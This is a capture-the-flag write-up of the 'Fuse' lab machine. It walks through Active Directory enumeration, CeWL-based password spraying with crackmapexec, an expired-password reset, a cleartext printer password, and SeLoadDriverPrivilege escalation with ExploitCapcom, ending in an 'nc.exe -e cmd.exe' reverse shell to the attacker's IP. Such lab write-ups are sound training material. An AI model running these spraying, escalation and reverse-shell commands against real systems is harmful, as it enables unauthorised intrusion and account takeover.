---
description: 09-09-22
---

# Fuse (Medium)

### Improved skills

* Research and exploit development
* RPC enumeration (enumerating printers and users)
* CeWL usage for generating custom wordlists
* Kerbrute user enumeration
* Changing SMB password with smbpasswd

### Used tools

* Nmap -- NmapAutomator.sh
* Kerbrute
* EvilWinRM
* rpcclient
* enum4linux
* cewl
* crackmapexec
* smbpasswd

## Information Gathering

Scanned all TCP ports:

```
PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-09-09 20:00:54Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: FABRICORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49675/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc        Microsoft Windows RPC
49678/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

<mark style="color:yellow;">Domain: fabricorp.local</mark>

Enumerated UDP ports:

```
PORT    STATE SERVICE VERSION
53/udp  open  domain  (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   NBTStat: 
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
123/udp open  ntp     NTP v3
389/udp open  ldap    Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Notes:

53/DNS - Zone Transfer? -- Attempted and failed

80/HTTP - Website visited and it cannot load but we see a fuse subdomain in the URL -- Adding fuse.fabricorp.local to /etc/hosts

* Upon visiting, we see a PaperCut site. In the Print Logs, I see user names and throw every one I can find into a user.txt file.

88/Kerberos - Kerberoasting (need credentials) -- AS-REPRoasting (need a valid user)

* Kerbrute
* Attempted AS-REPRoasting none of the users I found (so far) doesn't have Kerberos Pre-Authentication disabled.
* 5985 -- We can WinRM into this box with valid credentials

## Enumeration

### Visual Inspection

* Users list created with the following possible users&#x20;
* These were found in the logs directly on the site

```
bnielson
pmerton
tlavel
sthompson
bhult
administrator
JUMP01
LONWK015        
HP-MFT01
Fabricorp01
LONWK019
offsite_dr_invocation
LAPTOP07
FUSE
printing_issue_test
```

### Enum4Linux

```
enum4linux 10.129.54.112
```

* Nothing useful was returned

### Whatweb

```
whatweb http://10.129.54.112 -v 
```

Microsoft-IIS/10.0

### Kerbrute

{% embed url="https://github.com/ropnop/kerbrute/releases/tag/v1.0.3" %}
GitHub Repository
{% endembed %}

```
./kerbrute_linux_amd64 userenum --dc 10.129.54.112 -d fabricorp.local users


    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/09/22 - Ronnie Flathers @ropnop

2022/09/09 16:38:40 >  Using KDC(s):
2022/09/09 16:38:40 >   10.129.54.112:88

2022/09/09 16:38:40 >  [+] VALID USERNAME:       bnielson@fabricorp.local
2022/09/09 16:38:40 >  [+] VALID USERNAME:       bhult@fabricorp.local
2022/09/09 16:38:41 >  [+] VALID USERNAME:       tlavel@fabricorp.local
2022/09/09 16:38:41 >  [+] VALID USERNAME:       administrator@fabricorp.local
2022/09/09 16:38:41 >  [+] VALID USERNAME:       sthompson@fabricorp.local
2022/09/09 16:38:41 >  [+] VALID USERNAME:       pmerton@fabricorp.local
2022/09/09 16:38:41 >  Done! Tested 6 usernames (6 valid) in 0.148 seconds
```

* We have confirmed valid users from our list.&#x20;
* What is next?
* Now that we have a list of users, we need to try to find the passwords for them.

### Cewl

* This tool will help us scrape the website for any useful strings and place them into a text file to be used as a password list
* As a good precaution, always put the --with-numbers argument!

```
cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers -w cewl.txt -d 5
```

* We can now use this generated wordlist in conjunction with crackmapexec to spray passwords on the target

### Crackmapexec

```
crackmapexec smb 10.129.54.112 -u users -p cewl.txt --continue-on-success

SMB         10.129.54.112   445    FUSE             [-] fabricorp.local\bnielson:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.54.112   445    FUSE             [-] fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.54.112   445    FUSE             [-] fabricorp.local\bhult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
```

* We get a strange hit on 3 different combinations
* When googling this error I came across this article

### status\_password\_must\_change

{% embed url="https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/" %}

* There is a tool to achieve this and it is called smbpasswd

### smbpasswd

```
smbpasswd -r 10.129.54.112 -U tlavel
Old SMB password: Fabricorp01
New SMB password: Password2
Retype new SMB password: Password2
Password changed for user tlavel
```

### Rpcclient

{% embed url="https://www.hackingarticles.in/active-directory-enumeration-rpcclient/" %}

```
rpcclient 10.129.54.112 -U tlavel

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[svc-print] rid:[0x450]
user:[bnielson] rid:[0x451]
user:[sthompson] rid:[0x641]
user:[tlavel] rid:[0x642]
user:[pmerton] rid:[0x643]
user:[svc-scan] rid:[0x645]
user:[bhult] rid:[0x1bbd]
user:[dandrews] rid:[0x1bbe]
user:[mberbatov] rid:[0x1db1]
user:[astein] rid:[0x1db2]
user:[dmuir] rid:[0x1db3]

```

* I added these new users into the users file and place the new ones in their own seperate file called domusers

{% code overflow="wrap" %}
```
rpcclient $> enumprinters
        flags:[0x800000]
        name:[\\10.129.54.112\HP-MFT01]
        description:[\\10.129.54.112\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
        comment:[]
```
{% endcode %}

* <mark style="color:yellow;">Password: $fab@s3Rv1ce$1</mark>
  * <mark style="color:yellow;">Place the new password in a new password.txt</mark>
* With these new credentials, let's spray the target again

```
crackmapexec smb 10.129.54.112 -u domusers -p password.txt --continue-on-success

SMB         10.129.54.112   445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.129.54.112   445    FUSE             [-] fabricorp.local\Administrator:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.129.54.112   445    FUSE             [-] fabricorp.local\Guest:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.129.54.112   445    FUSE             [-] fabricorp.local\krbtgt:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.129.54.112   445    FUSE             [-] fabricorp.local\DefaultAccount:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.129.54.112   445    FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 
SMB         10.129.54.112   445    FUSE             [-] fabricorp.local\bnielson:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.129.54.112   445    FUSE             [-] fabricorp.local\sthompson:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.129.54.112   445    FUSE             [-] fabricorp.local\tlavel:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.129.54.112   445    FUSE             [-] fabricorp.local\pmerton:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.129.54.112   445    FUSE             [+] fabricorp.local\svc-scan:$fab@s3Rv1ce$1 
SMB         10.129.54.112   445    FUSE             [-] fabricorp.local\bhult:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.129.54.112   445    FUSE             [-] fabricorp.local\dandrews:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.129.54.112   445    FUSE             [-] fabricorp.local\mberbatov:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.129.54.112   445    FUSE             [-] fabricorp.local\astein:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.129.54.112   445    FUSE             [-] fabricorp.local\dmuir:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE
```

Successful

```
[+] fabricorp.local\svc-print:$fab@s3Rv1ce$1
[+] fabricorp.local\svc-scan:$fab@s3Rv1ce$1 
```

Let's try again with winrm

```
crackmapexec winrm 10.129.54.112 -u domusers -p password.txt --continue-on-success                                                         Fri 09 Sep 2022 07:31:50 PM EDT
SMB         10.129.54.112   5985   FUSE             [*] Windows 10.0 Build 14393 (name:FUSE) (domain:fabricorp.local)
HTTP        10.129.54.112   5985   FUSE             [*] http://10.129.54.112:5985/wsman
WINRM       10.129.54.112   5985   FUSE             [-] fabricorp.local\Administrator:$fab@s3Rv1ce$1
WINRM       10.129.54.112   5985   FUSE             [-] fabricorp.local\Guest:$fab@s3Rv1ce$1
WINRM       10.129.54.112   5985   FUSE             [-] fabricorp.local\krbtgt:$fab@s3Rv1ce$1
WINRM       10.129.54.112   5985   FUSE             [-] fabricorp.local\DefaultAccount:$fab@s3Rv1ce$1
WINRM       10.129.54.112   5985   FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)
WINRM       10.129.54.112   5985   FUSE             [-] fabricorp.local\bnielson:$fab@s3Rv1ce$1
WINRM       10.129.54.112   5985   FUSE             [-] fabricorp.local\sthompson:$fab@s3Rv1ce$1
WINRM       10.129.54.112   5985   FUSE             [-] fabricorp.local\tlavel:$fab@s3Rv1ce$1
WINRM       10.129.54.112   5985   FUSE             [-] fabricorp.local\pmerton:$fab@s3Rv1ce$1
WINRM       10.129.54.112   5985   FUSE             [-] fabricorp.local\svc-scan:$fab@s3Rv1ce$1
WINRM       10.129.54.112   5985   FUSE             [-] fabricorp.local\bhult:$fab@s3Rv1ce$1
WINRM       10.129.54.112   5985   FUSE             [-] fabricorp.local\dandrews:$fab@s3Rv1ce$1
WINRM       10.129.54.112   5985   FUSE             [-] fabricorp.local\mberbatov:$fab@s3Rv1ce$1
WINRM       10.129.54.112   5985   FUSE             [-] fabricorp.local\astein:$fab@s3Rv1ce$1
WINRM       10.129.54.112   5985   FUSE             [-] fabricorp.local\dmuir:$fab@s3Rv1ce$1

```

Successful

```
[+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)
```

## Exploitation

### Evil-WinRM: Clear-text credentials in domain configuration information

* The password for svc-print was obtained via enumeration of RPC (rpcclient)

### Evil-WinRM

```
evil-winrm -i 10.129.54.112 -u svc_print
Enter Password: $fab@s3Rv1ce$1
```

## Privilege Escalation

### Local enumeration

whoami /all

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

* This shows that <mark style="color:yellow;">SeLoadDriverPrivilege</mark> is <mark style="color:yellow;">enabled</mark> on this user

### PrivEsc vector

<mark style="color:yellow;">SeLoadDriverPrivilege</mark>&#x20;

### Exploitation

{% embed url="https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://github.com/clubby789/ExploitCapcom/releases/download/1.0/ExploitCapcom.exe" %}
Exploit
{% endembed %}

1. Upload the exploit to the target
2. Upload nc.exe to the target
3. Execute the exploit with `./ExploitCapcom.exe`
4. Test exploit success with `./ExploitCapcom.exe EXPLOIT whoami`
5. Establish Netcat listener with `nc -lnvp 1337` on kali
6. Execute reverse shell with `./ExploitCapcom.exe EXPLOIT "nc.exe -e cmd.exe 10.10.16.17 1337"`

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption><p>SYSTEM</p></figcaption></figure>

### Research

* Within the Windows realm, it is well known that if you assign certain privileges to user accounts without administrator permissions, it can result in privilege escalation attacks.
* Why is this vulnerable you may ask? <mark style="color:yellow;">Well, it is because we are taking advantage of a user who is allowed to dynamically load a device driver.</mark>
* <mark style="color:yellow;">The activation of this policy in the context of a non-privileged user implies a SIGNIFICANT risk due to the possibility of arbitrary code execution in kernel space.</mark>

## Proofs

User:

<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

SYSTEM:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
